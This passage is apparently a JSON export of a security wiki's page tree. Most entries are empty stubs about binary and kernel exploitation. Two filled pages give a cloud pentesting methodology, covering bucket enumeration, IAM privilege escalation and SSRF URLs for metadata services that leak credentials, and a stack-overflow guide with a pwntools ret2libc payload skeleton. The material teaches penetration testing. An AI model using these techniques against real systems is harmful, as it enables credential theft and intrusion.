   "slug": "cloud-security",
   "type": "category",
   "children": [
    {
     "title": "Pentesting Kubernetes",
     "slug": "pentesting-kubernetes",
     "type": "page",
     "children": [],
     "tag": "TAG-0789",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Pentesting Cloud (AWS, GCP, Az...)",
     "slug": "pentesting-cloud-aws-gcp-az",
     "type": "page",
     "children": [],
     "tag": "TAG-0790",
     "content": "# Cloud Pentesting Overview (AWS / Azure / GCP)\n\n## Recon: Identify What You're Dealing With\n```bash\n# AWS\nnslookup target.com | grep -i amazonaws\ndig target.com | grep cloudfront\n# Azure\nnslookup target.com | grep -i azurewebsites\n# GCP\nnslookup target.com | grep -i appspot\n```\nS3/Blob/GCS bucket naming conventions often mirror the company name — worth brute-forcing common patterns (`target-prod`, `target-backup`, `target-assets`) regardless of provider.\n\n## AWS\n### S3 Bucket Enumeration\n```bash\naws s3 ls s3://bucket-name --no-sign-request     # try unauthenticated first\ns3scanner scan --bucket-file names.txt\n```\nCheck for: public read (data exposure), public write (defacement/malware hosting), and public ACLs left on individual objects even if the bucket policy looks locked down.\n\n### IAM Enumeration (with any creds)\n```bash\naws sts get-caller-identity\naws iam list-attached-user-policies --user-name <user>\npacu   # framework specifically for AWS post-exploitation, automates most of this\n```\n\n### Privilege Escalation Patterns\n- `iam:PassRole` + ability to launch an EC2/Lambda with an over-privileged role attached → escalate by running code as that role.\n- `iam:CreatePolicyVersion` on your own user → grant yourself a new permissive policy version.\n- Overly broad `iam:*` or `*:*` wildcard policies left on \"temporary\" test roles that were never cleaned up.\n\n### SSRF → Metadata Service (extremely common finding)\n```\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>\n```\nIMDSv1 (no token required) is still enabled on many instances — an SSRF anywhere in the app can lead directly to instance role credentials.\n\n## Azure\n```bash\naz login\naz account show\nGet-AzureADUser                                    # AzureAD/AzAD PowerShell modules\nROADrecon                                           # comprehensive Azure AD recon tool\n```\n- Check for overly permissive App Registrations / Service Principals with `Application.ReadWrite.All` or similar broad Graph API scopes.\n- Managed Identity abuse follows the same SSRF → metadata pattern as AWS: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (requires `Metadata: true` header).\n\n## GCP\n```bash\ngcloud auth list\ngcloud projects get-iam-policy <project-id>\ngcpbucketbrute -k -p <project-name>\n```\n- Metadata endpoint SSRF: `http://metadata.google.internal/computeMetadata/v1/` (requires `Metadata-Flavor: Google` header).\n- Check for overly permissive default service accounts still attached to Compute Engine instances (a long-standing GCP footgun).\n\n## Cross-Cloud Checklist\n- [ ] Storage buckets/containers with public read/write\n- [ ] Metadata service reachable via SSRF, misconfigured proxy, or from inside a compromised workload\n- [ ] Overprivileged service accounts/roles attached to compute resources\n- [ ] Secrets/API keys committed to source control referencing cloud resources\n- [ ] Cross-account trust relationships wider than necessary (AWS role assumption, Azure guest access, GCP cross-project IAM)\n- [ ] Logging/monitoring actually enabled (CloudTrail, Azure Monitor, GCP Audit Logs) — a finding on its own if disabled, since it blinds incident response\n\n## Reporting Focus\nCloud findings should always be framed in terms of blast radius: what data, what compute, and what *other* accounts/resources become reachable from the specific misconfiguration found.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "Pentesting CI/CD (Github, Jenkins, Terraform...)",
     "slug": "pentesting-cicd-github-jenkins-terraform",
     "type": "page",
     "children": [],
     "tag": "TAG-0791",
     "content": "",
     "status": "empty",
     "updated": null
    }
   ],
   "color": "#7FA8D9"
  },
  {
   "title": "😎 Hardware/Physical Access",
   "slug": "hardwarephysical-access",
   "type": "category",
   "children": [
    {
     "title": "Physical Attacks",
     "slug": "physical-attacks",
     "type": "page",
     "children": [],
     "tag": "TAG-0792",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Escaping from KIOSKs",
     "slug": "escaping-from-kiosks",
     "type": "page",
     "children": [],
     "tag": "TAG-0793",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Firmware Analysis",
     "slug": "firmware-analysis",
     "type": "page",
     "children": [
      {
       "title": "Android Mediatek Secure Boot Bl2 Ext Bypass El3",
       "slug": "android-mediatek-secure-boot-bl2-ext-bypass-el3",
       "type": "page",
       "children": [],
       "tag": "TAG-0795",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Bootloader testing",
       "slug": "bootloader-testing",
       "type": "page",
       "children": [],
       "tag": "TAG-0796",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Firmware Integrity",
       "slug": "firmware-integrity",
       "type": "page",
       "children": [],
       "tag": "TAG-0797",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0794",
     "content": "",
     "status": "empty",
     "updated": null
    }
   ],
   "color": "#B08968"
  },
  {
   "title": "🎯 Binary Exploitation",
   "slug": "binary-exploitation",
   "type": "category",
   "children": [
    {
     "title": "Basic Stack Binary Exploitation Methodology",
     "slug": "basic-stack-binary-exploitation-methodology",
     "type": "page",
     "children": [
      {
       "title": "ELF Basic Information",
       "slug": "elf-basic-information",
       "type": "page",
       "children": [],
       "tag": "TAG-0799",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Exploiting Tools",
       "slug": "exploiting-tools",
       "type": "page",
       "children": [
        {
         "title": "PwnTools",
         "slug": "pwntools",
         "type": "page",
         "children": [],
         "tag": "TAG-0801",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0800",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0798",
     "content": "# Stack-Based Binary Exploitation Methodology\n\n## 1. Recon the Binary\n```bash\nfile target\nchecksec target                 # canary, NX, PIE, RELRO status — decides which technique applies\n```\n| Protection | Impact on approach |\n|---|---|\n| No canary | Straightforward stack smashing possible |\n| NX enabled | Can't execute shellcode on stack directly → need ROP |\n| PIE enabled | Addresses randomized per run → need a leak first |\n| Full RELRO | GOT overwrite techniques won't work |\n\n## 2. Find the Crash / Offset\n```bash\n# Generate a cyclic pattern to find exact offset to RIP/EIP\npython3 -c \"from pwn import *; print(cyclic(200))\"\n# after crash, find offset from the value in RIP/EIP\npython3 -c \"from pwn import *; print(cyclic_find(0x6161616c))\"\n```\n\n## 3. Choose a Technique Based on Protections\n- **No NX**: shellcode directly on the stack, jump to it.\n- **NX, no PIE**: ret2libc or ROP chain using known/static addresses.\n- **NX + PIE**: need an info leak first (format string bug, or a partial overwrite) to defeat ASLR before building the ROP chain.\n- **Canary present**: need a leak of the canary value (common via format string, or if canary is per-thread and you can read adjacent memory) before overwriting return address.\n\n## 4. Building a Basic ROP Chain (ret2libc example)\n```python\nfrom pwn import *\nelf = ELF('./target')\nlibc = ELF('./libc.so.6')\n\noffset = 72  # from cyclic_find\npayload = b'A' * offset\npayload += p64(pop_rdi_gadget)\npayload += p64(binsh_addr)\npayload += p64(system_plt)\n```\n\n## 5. Common Gadget-Finding Tools\n```bash\nROPgadget --binary target | grep \"pop rdi\"\nropper --file target --search \"pop rdi\"\n```\n\n## Debugging Workflow\n```bash\ngdb -q ./target\npwndbg> cyclic 200            # generate pattern inside gdb (pwndbg/gef)\npwndbg> run < payload\npwndbg> cyclic -l 0x6161616c  # find offset after crash\n```\nUse `pwndbg` or `GEF` extensions — vastly better stack/register visualization than stock GDB for exploit dev.\n\n## Mental Model\nEvery stack exploit is really: (1) find the exact byte offset to control RIP/EIP, (2) figure out what you're allowed to redirect execution *to* given the binary's protections, (3) chain enough control to get code execution or leak what you need to remove the next protection layer.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "Stack Overflow",
     "slug": "stack-overflow",
     "type": "page",
     "children": [
      {
       "title": "Pointer Redirecting",
       "slug": "pointer-redirecting",
       "type": "page",
       "children": [],
       "tag": "TAG-0803",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Ret2win",
       "slug": "ret2win",
       "type": "page",
       "children": [
        {
         "title": "Ret2win - arm64",
         "slug": "ret2win---arm64",
         "type": "page",
         "children": [],
         "tag": "TAG-0805",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0804",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Stack Shellcode",
       "slug": "stack-shellcode",
       "type": "page",
       "children": [
        {
         "title": "Stack Shellcode - arm64",
         "slug": "stack-shellcode---arm64",
         "type": "page",
         "children": [],
         "tag": "TAG-0807",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0806",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Stack Pivoting",
       "slug": "stack-pivoting",
       "type": "page",
       "children": [],
       "tag": "TAG-0808",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Uninitialized Variables",
       "slug": "uninitialized-variables",
       "type": "page",
       "children": [],
       "tag": "TAG-0809",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "ROP & JOP",
       "slug": "rop-jop",
       "type": "page",
       "children": [],
       "tag": "TAG-0810",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "BROP - Blind Return Oriented Programming",
       "slug": "brop---blind-return-oriented-programming",
       "type": "page",
       "children": [],
       "tag": "TAG-0811",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Ret2csu",
       "slug": "ret2csu",
       "type": "page",
       "children": [],
       "tag": "TAG-0812",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Ret2dlresolve",
       "slug": "ret2dlresolve",
       "type": "page",
       "children": [],
       "tag": "TAG-0813",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Ret2esp / Ret2reg",
       "slug": "ret2esp-ret2reg",
       "type": "page",
       "children": [],
       "tag": "TAG-0814",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Ret2lib",
       "slug": "ret2lib",
       "type": "page",
       "children": [
        {
         "title": "Leaking libc address with ROP",
         "slug": "leaking-libc-address-with-rop",
         "type": "page",
         "children": [
          {
           "title": "Leaking libc - template",
           "slug": "leaking-libc---template",
           "type": "page",
           "children": [],
           "tag": "TAG-0817",
           "content": "",
           "status": "empty",
           "updated": null
          }
         ],
         "tag": "TAG-0816",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "One Gadget",
         "slug": "one-gadget",
         "type": "page",
         "children": [],
         "tag": "TAG-0818",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Ret2lib + Printf leak - arm64",
         "slug": "ret2lib-printf-leak---arm64",
         "type": "page",
         "children": [],
         "tag": "TAG-0819",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0815",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Ret2syscall",
       "slug": "ret2syscall",
       "type": "page",
       "children": [
        {
         "title": "Ret2syscall - arm64",
         "slug": "ret2syscall---arm64",
         "type": "page",
         "children": [],
         "tag": "TAG-0821",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0820",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Ret2vDSO",
       "slug": "ret2vdso",
       "type": "page",
       "children": [],
       "tag": "TAG-0822",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "SROP - Sigreturn-Oriented Programming",
       "slug": "srop---sigreturn-oriented-programming",
       "type": "page",
       "children": [
        {
         "title": "SROP - arm64",
         "slug": "srop---arm64",
         "type": "page",
         "children": [],
         "tag": "TAG-0824",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0823",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Mediatek Xflash Carbonara Da2 Hash Bypass",
       "slug": "mediatek-xflash-carbonara-da2-hash-bypass",
       "type": "page",
       "children": [],
       "tag": "TAG-0825",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Synology Encrypted Archive Decryption",
       "slug": "synology-encrypted-archive-decryption",
       "type": "page",
       "children": [],
       "tag": "TAG-0826",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Windows SEH Overflow",
       "slug": "windows-seh-overflow",
       "type": "page",
       "children": [],
       "tag": "TAG-0827",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0802",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Array Indexing",
     "slug": "array-indexing",
     "type": "page",
     "children": [],
     "tag": "TAG-0828",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Chrome Exploiting",
     "slug": "chrome-exploiting",
     "type": "page",
     "children": [],
     "tag": "TAG-0829",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Common Exploiting Problems Unsafe Relocation Fixups",
     "slug": "common-exploiting-problems-unsafe-relocation-fixups",
     "type": "page",
     "children": [],
     "tag": "TAG-0830",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Integer Overflow",
     "slug": "integer-overflow-2",
     "type": "page",
     "children": [],
     "tag": "TAG-0831",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Format Strings",
     "slug": "format-strings",
     "type": "page",
     "children": [
      {
       "title": "Format Strings - Arbitrary Read Example",
       "slug": "format-strings---arbitrary-read-example",
       "type": "page",
       "children": [],
       "tag": "TAG-0833",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Format Strings Template",
       "slug": "format-strings-template",
       "type": "page",
       "children": [],
       "tag": "TAG-0834",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0832",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Libc Heap",
     "slug": "libc-heap",
     "type": "page",
     "children": [
      {
       "title": "Bins & Memory Allocations",
       "slug": "bins-memory-allocations",
       "type": "page",
       "children": [],
       "tag": "TAG-0836",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Heap Memory Functions",
       "slug": "heap-memory-functions",
       "type": "page",
       "children": [
        {
         "title": "free",
         "slug": "free",
         "type": "page",
         "children": [],
         "tag": "TAG-0838",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "malloc & sysmalloc",
         "slug": "malloc-sysmalloc",
         "type": "page",
         "children": [],
         "tag": "TAG-0839",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "unlink",
         "slug": "unlink",
         "type": "page",
         "children": [],
         "tag": "TAG-0840",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Heap Functions Security Checks",
         "slug": "heap-functions-security-checks",
         "type": "page",
         "children": [],
         "tag": "TAG-0841",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0837",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Use After Free",
       "slug": "use-after-free",
       "type": "page",
       "children": [
        {
         "title": "First Fit",
         "slug": "first-fit",
         "type": "page",
         "children": [],
         "tag": "TAG-0843",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0842",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Double Free",
       "slug": "double-free",
       "type": "page",
       "children": [],
       "tag": "TAG-0844",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Gnu Obstack Function Pointer Hijack",
       "slug": "gnu-obstack-function-pointer-hijack",
       "type": "page",
       "children": [],
       "tag": "TAG-0845",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Overwriting a freed chunk",
       "slug": "overwriting-a-freed-chunk",
       "type": "page",
       "children": [],
       "tag": "TAG-0846",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Heap Overflow",
       "slug": "heap-overflow",
       "type": "page",
       "children": [],
       "tag": "TAG-0847",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Unlink Attack",
       "slug": "unlink-attack",
       "type": "page",
       "children": [],
       "tag": "TAG-0848",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Fast Bin Attack",
       "slug": "fast-bin-attack",
       "type": "page",
       "children": [],
       "tag": "TAG-0849",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Unsorted Bin Attack",
       "slug": "unsorted-bin-attack",
       "type": "page",
       "children": [],
       "tag": "TAG-0850",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Large Bin Attack",
       "slug": "large-bin-attack",
       "type": "page",
       "children": [],
       "tag": "TAG-0851",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Tcache Bin Attack",
       "slug": "tcache-bin-attack",
       "type": "page",
       "children": [],
       "tag": "TAG-0852",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Off by one overflow",
       "slug": "off-by-one-overflow",
       "type": "page",
       "children": [],
       "tag": "TAG-0853",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "House of Spirit",
       "slug": "house-of-spirit",
       "type": "page",
       "children": [],
       "tag": "TAG-0854",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "House of Lore | Small bin Attack",
       "slug": "house-of-lore-small-bin-attack",
       "type": "page",
       "children": [],
       "tag": "TAG-0855",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "House of Einherjar",
       "slug": "house-of-einherjar",
       "type": "page",
       "children": [],
       "tag": "TAG-0856",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "House of Force",
       "slug": "house-of-force",
       "type": "page",
       "children": [],
       "tag": "TAG-0857",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "House of Orange",
       "slug": "house-of-orange",
       "type": "page",
       "children": [],
       "tag": "TAG-0858",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "House of Rabbit",
       "slug": "house-of-rabbit",
       "type": "page",
       "children": [],
       "tag": "TAG-0859",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "House of Roman",
       "slug": "house-of-roman",
       "type": "page",
       "children": [],
       "tag": "TAG-0860",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0835",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Common Binary Exploitation Protections & Bypasses",
     "slug": "common-binary-exploitation-protections-bypasses",
     "type": "page",
     "children": [
      {
       "title": "ASLR",
       "slug": "aslr",
       "type": "page",
       "children": [
        {
         "title": "Ret2plt",
         "slug": "ret2plt",
         "type": "page",
         "children": [],
         "tag": "TAG-0863",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Ret2ret & Reo2pop",
         "slug": "ret2ret-reo2pop",
         "type": "page",
         "children": [],
         "tag": "TAG-0864",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0862",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "CET & Shadow Stack",
       "slug": "cet-shadow-stack",
       "type": "page",
       "children": [],
       "tag": "TAG-0865",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Libc Protections",
       "slug": "libc-protections",
       "type": "page",
       "children": [],
       "tag": "TAG-0866",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Memory Tagging Extension (MTE)",
       "slug": "memory-tagging-extension-mte",
       "type": "page",
       "children": [],
       "tag": "TAG-0867",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "No-exec / NX",
       "slug": "no-exec-nx",
       "type": "page",
       "children": [],
       "tag": "TAG-0868",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "PIE",
       "slug": "pie",
       "type": "page",
       "children": [
        {
         "title": "BF Addresses in the Stack",
         "slug": "bf-addresses-in-the-stack",
         "type": "page",
         "children": [],
         "tag": "TAG-0870",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0869",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Relro",
       "slug": "relro",
       "type": "page",
       "children": [],
       "tag": "TAG-0871",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Stack Canaries",
       "slug": "stack-canaries",
       "type": "page",
       "children": [
        {
         "title": "BF Forked & Threaded Stack Canaries",
         "slug": "bf-forked-threaded-stack-canaries",
         "type": "page",
         "children": [],
         "tag": "TAG-0873",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Print Stack Canary",
         "slug": "print-stack-canary",
         "type": "page",
         "children": [],
         "tag": "TAG-0874",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0872",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0861",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Write What Where 2 Exec",
     "slug": "write-what-where-2-exec",
     "type": "page",
     "children": [
      {
       "title": "Aw2exec Sips Icc Profile",
       "slug": "aw2exec-sips-icc-profile",
       "type": "page",
       "children": [],
       "tag": "TAG-0876",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "WWW2Exec - atexit()",
       "slug": "www2exec---atexit",
       "type": "page",
       "children": [],
       "tag": "TAG-0877",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "WWW2Exec - .dtors & .fini_array",
       "slug": "www2exec---dtors-finiarray",
       "type": "page",
       "children": [],
       "tag": "TAG-0878",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "WWW2Exec - GOT/PLT",
       "slug": "www2exec---gotplt",
       "type": "page",
       "children": [],
       "tag": "TAG-0879",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "WWW2Exec - \\_\\_malloc_hook & \\_\\_free_hook",
       "slug": "www2exec---mallochook-freehook",
       "type": "page",
       "children": [],
       "tag": "TAG-0880",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "WWW2Exec - \\_\\_printf_arginfo_table",
       "slug": "www2exec---printfarginfotable",
       "type": "page",
       "children": [],
       "tag": "TAG-0881",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Virtualbox Slirp Nat Packet Heap Exploitation",
       "slug": "virtualbox-slirp-nat-packet-heap-exploitation",
       "type": "page",
       "children": [],
       "tag": "TAG-0882",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0875",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Common Exploiting Problems",
     "slug": "common-exploiting-problems",
     "type": "page",
     "children": [],
     "tag": "TAG-0883",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Adreno A7xx Sds Rb Priv Bypass Gpu Smmu Kernel Rw",
     "slug": "adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw",
     "type": "page",
     "children": [],
     "tag": "TAG-0884",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Af Unix Msg Oob Uaf Skb Primitives",
     "slug": "af-unix-msg-oob-uaf-skb-primitives",
     "type": "page",
     "children": [],
     "tag": "TAG-0885",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Arm64 Static Linear Map Kaslr Bypass",
     "slug": "arm64-static-linear-map-kaslr-bypass",
     "type": "page",
     "children": [],
     "tag": "TAG-0886",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Ksmbd Streams Xattr Oob Write Cve 2025 37947",
     "slug": "ksmbd-streams-xattr-oob-write-cve-2025-37947",
     "type": "page",
     "children": [],
     "tag": "TAG-0887",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Pixel Bigwave Bigo Job Timeout Uaf Kernel Write",
     "slug": "pixel-bigwave-bigo-job-timeout-uaf-kernel-write",
     "type": "page",
     "children": [],
     "tag": "TAG-0888",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Linux kernel exploitation - toctou",
     "slug": "linux-kernel-exploitation---toctou",
     "type": "page",
     "children": [],
     "tag": "TAG-0889",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "PS5 compromission",
     "slug": "ps5-compromission",
     "type": "page",
     "children": [],
     "tag": "TAG-0890",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Vmware Workstation Pvscsi Lfh Escape",
     "slug": "vmware-workstation-pvscsi-lfh-escape",
     "type": "page",
     "children": [],
     "tag": "TAG-0891",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Windows Exploiting (Basic Guide - OSCP lvl)",
     "slug": "windows-exploiting-basic-guide---oscp-lvl",
     "type": "page",
     "children": [],
     "tag": "TAG-0892",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Windows Vectored Overloading",
     "slug": "windows-vectored-overloading",
     "type": "page",
     "children": [],
     "tag": "TAG-0893",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "iOS Exploiting",
     "slug": "ios-exploiting",
     "type": "page",
     "children": [
      {
       "title": "ios CVE-2020-27950-mach_msg_trailer_t",
       "slug": "ios-cve-2020-27950-machmsgtrailert",
       "type": "page",
       "children": [],
       "tag": "TAG-0895",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "ios CVE-2021-30807-IOMobileFrameBuffer",
       "slug": "ios-cve-2021-30807-iomobileframebuffer",
       "type": "page",
       "children": [],
       "tag": "TAG-0896",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Imessage Media Parser Zero Click Coreaudio Pac Bypass",
       "slug": "imessage-media-parser-zero-click-coreaudio-pac-bypass",
       "type": "page",
       "children": [],
       "tag": "TAG-0897",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "ios Corellium",
       "slug": "ios-corellium",
       "type": "page",
       "children": [],
       "tag": "TAG-0898",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "ios Heap Exploitation",
       "slug": "ios-heap-exploitation",
       "type": "page",
       "children": [],
       "tag": "TAG-0899",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "ios Physical UAF - IOSurface",
       "slug": "ios-physical-uaf---iosurface",
       "type": "page",
       "children": [],
       "tag": "TAG-0900",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Webkit Dfg Store Barrier Uaf Angle Oob",
       "slug": "webkit-dfg-store-barrier-uaf-angle-oob",
       "type": "page",
       "children": [],
       "tag": "TAG-0901",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0894",
     "content": "",
     "status": "empty",
     "updated": null
    }
   ],
   "color": "#E85D5D"
  },
  {
   "title": "🤖 AI",
   "slug": "ai",
   "type": "category",
   "children": [
    {
     "title": "AI Security",
     "slug": "ai-security",
     "type": "page",
     "children": [
      {
       "title": "Ai Assisted Fuzzing And Vulnerability Discovery",
       "slug": "ai-assisted-fuzzing-and-vulnerability-discovery",
       "type": "page",
       "children": [],
       "tag": "TAG-0903",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "AI Security Methodology",
       "slug": "ai-security-methodology",
       "type": "page",
       "children": [],
       "tag": "TAG-0904",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Burp MCP: LLM-assisted traffic review",
       "slug": "burp-mcp-llm-assisted-traffic-review",
       "type": "page",
       "children": [],
       "tag": "TAG-0905",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "AI MCP Security",
       "slug": "ai-mcp-security",
       "type": "page",
       "children": [],
       "tag": "TAG-0906",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "AI Model Data Preparation",
       "slug": "ai-model-data-preparation",
       "type": "page",
       "children": [],
       "tag": "TAG-0907",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "AI Models RCE",
       "slug": "ai-models-rce",
       "type": "page",
       "children": [],
       "tag": "TAG-0908",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "AI Prompts",
       "slug": "ai-prompts",
       "type": "page",
       "children": [],
       "tag": "TAG-0909",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "AI Risk Frameworks",
       "slug": "ai-risk-frameworks",
       "type": "page",
       "children": [],
       "tag": "TAG-0910",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "AI Supervised Learning Algorithms",
       "slug": "ai-supervised-learning-algorithms",
       "type": "page",
       "children": [],
       "tag": "TAG-0911",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "AI Unsupervised Learning Algorithms",
       "slug": "ai-unsupervised-learning-algorithms",
       "type": "page",
       "children": [],
       "tag": "TAG-0912",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "AI Reinforcement Learning Algorithms",
       "slug": "ai-reinforcement-learning-algorithms",
       "type": "page",
       "children": [],
       "tag": "TAG-0913",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "LLM Training",
       "slug": "llm-training",
       "type": "page",
       "children": [
        {
         "title": "0. Basic LLM Concepts",
         "slug": "0-basic-llm-concepts",
         "type": "page",
         "children": [],
         "tag": "TAG-0915",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "1. Tokenizing",
         "slug": "1-tokenizing",
         "type": "page",
         "children": [],
         "tag": "TAG-0916",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "2. Data Sampling",
         "slug": "2-data-sampling",
         "type": "page",
         "children": [],
         "tag": "TAG-0917",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "3. Token Embeddings",
         "slug": "3-token-embeddings",
         "type": "page",
         "children": [],
         "tag": "TAG-0918",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
